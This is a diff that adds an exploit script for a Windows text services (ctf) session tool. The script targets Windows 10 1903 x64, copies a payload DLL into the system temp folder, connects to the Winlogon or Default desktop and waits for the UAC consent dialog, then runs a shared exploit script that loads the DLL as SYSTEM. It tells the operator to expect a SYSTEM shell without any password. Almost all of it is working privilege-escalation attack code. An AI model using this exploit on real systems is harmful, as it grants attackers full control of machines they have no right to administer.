@@ -1,0 +1,53 @@
+# This script launches loads an arbitrary dll as SYSTEM on Win10 1903 x64. This
+# works by taking over the UAC consent dialog, which can be invoked by any
+# user (for example, by using the runas verb with ShellExecute()).
+
+# This exploit runs LoadLibraryA(C:\WINDOWS\TEMP\EXPLOIT.DLL) as SYSTEM.
+print Attempting to copy exploit payload...
+
+# Try to install the payload.
+run CMD /C COPY PAYLOAD64.DLL %SYSTEMROOT%\TEMP\EXPLOIT.DLL
+
+# Print a warning if that didnt work.
+repeat rc print
+repeat rc print !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+repeat rc print !!! THIS EXPLOIT REQUIRES C:\WINDOWS\TEMP\EXPLOIT.DLL TO EXIST !!!
+repeat rc print !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+repeat rc print
+
+print
+print Right click something and select "Run as Administrator", then wait
+print for a SYSTEM shell.
+print
+print !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+print !!! YOU DONT NEED TO KNOW ANY PASSWORD, JUST WAIT! !!!
+print !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+print
+
+# Find out if the PromptOnSecureDesktop is enabled.
+reg HKLM Software\Microsoft\Windows\CurrentVersion\Policies\System PromptOnSecureDesktop
+
+set r0 regval
+
+# Connect to the ctf service for the Winlogon desktop.
+repeat r0 connect Winlogon sid
+
+sub r0 1
+and r0 1
+
+# If it wasn't the "secure" desktop, just use the default one.
+repeat r0 connect Default sid
+
+# List all the avaialble clients.
+print Connected to ctf session, listing clients...
+
+scan
+
+print Waiting for the consent dialog to join the session...
+
+wait consent.exe
+
+print consent.exe has joined the session, starting exploit...
+
+# Now that we're connected and have a target selected, load the exploit script.
+script scripts\ctf-exploit-common-1903.ctf
